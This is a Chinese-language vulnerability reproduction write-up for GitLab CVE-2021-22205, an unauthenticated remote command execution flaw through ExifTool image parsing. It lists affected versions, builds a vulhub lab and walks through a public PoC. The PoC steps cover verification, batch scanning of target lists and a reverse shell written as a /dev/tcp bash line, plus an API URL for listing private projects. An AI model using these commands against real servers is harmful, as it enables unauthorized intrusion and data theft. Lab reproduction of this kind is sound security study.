# 0x00 漏洞概述
在GitLab CE/EE中发现了一个问题，影响了从11.9开始的所有版本。GitLab未正确验证传递给文件解析器的图像文件，导致远程命令执行。

GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用。
# 0x01 影响版本
该漏洞影响以下GitLab企业版和社区版：
- 13.10 <= Gitlab CE/EE < 13.10.3
- 13.9 <= Gitlab CE/EE < 13.9.6
- 11.9 <= Gitlab CE/EE < 13.8.8

使用如下命令可查看当前GitLab的版本：
```
cat /opt/gitlab/embedded/service/gitlab-rails/VERSION
```

# 0x02 漏洞分析
未授权的端点在于用户登录处：https://xx.xx.xx.xx/users/sign_up

还可以滥用Gitlab API接口列出所有项目（包括私有项目）
https://xx.xx.xx.xx/api/v4/projects/?simple=yes&private=true&per_page=1000&page=1

此漏洞是通过上传功能来实现RCE的，漏洞出于ExifTool功能处，用于从图像中移除元数据的开源工具，因为此工具在解析上传图像中的元数据时，并没有完全解析某些元数据，导致攻击者上传带有恶意元数据的图片，从而导致远程命令执行。

# 0x03 环境搭建
```
git clone https://github.com/vulhub/vulhub.git
cd vulhub/gitlab/CVE-2021-22205/
docker-compose up -d
```

环境启动后，访问http://your-ip:8080即可查看到GitLab的登录页面。

```
靶机：192.168.210.206
攻击机 windows：192.168.210.186
攻击机 kali：192.168.210.186
```

# 0x04 漏洞复现
- 🔗 [CVE-2021-22205.py](https://github.com/Al1ex/CVE-2021-22205)

## 1、访问GitLab登陆界面

未授权的端口在于用户登录处：https://xx.xx.xx.xx/users/sign_up

![image](https://user-images.githubusercontent.com/84888757/174459287-4880a9c3-99ae-4a21-afae-09b2399d6b2e.png)

## 2、漏洞验证
POC：https://github.com/Al1ex/CVE-2021-22205

验证：
```
python3 CVE-2021-22205.py -v true -t http://目标IP:Port
```

![image](https://user-images.githubusercontent.com/84888757/174459288-9763f890-2c58-43c0-9266-5085083458b5.png)


## 3、批量检测
python3 CVE-2021-2205.py -s true -f target.txt


## 4、反弹shell
1）kali开启监听
```
nc -lvvp 6666
```

2）在靶机的/tmp下写入一个1.sh文件，用于反弹shell
```
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "echo 'bash -i >& /dev/tcp/攻击方ip/port 0>&1' > /tmp/1.sh"
```

![image](https://user-images.githubusercontent.com/84888757/174459383-bc832b38-a685-42ac-97d7-cfcbded95fb2.png)

在靶机查看/tmp目录下已经写入一个1.sh文件：

![image](https://user-images.githubusercontent.com/84888757/174459394-cd5a8676-4131-409b-a726-eae73c7240f3.png)



3）给写入的1.sh文件添加执行权限
```
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "chmod +x /tmp/1.sh"
```

![image](https://user-images.githubusercontent.com/84888757/174459397-16f3a133-4d6a-44dd-b161-3974a7e9f0cf.png)

在靶机查看`1.sh`已经添加了执行权限：

![image](https://user-images.githubusercontent.com/84888757/174459410-e01f9ac8-4fb5-4557-a565-21bebe381be9.png)


4）执行`1.sh`文件
```
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "/bin/bash /tmp/1.sh"
```

5）kali收到反弹的shell

![image](https://user-images.githubusercontent.com/84888757/174459421-e4edf211-5a7c-40ba-8e8c-528aeabadc88.png)

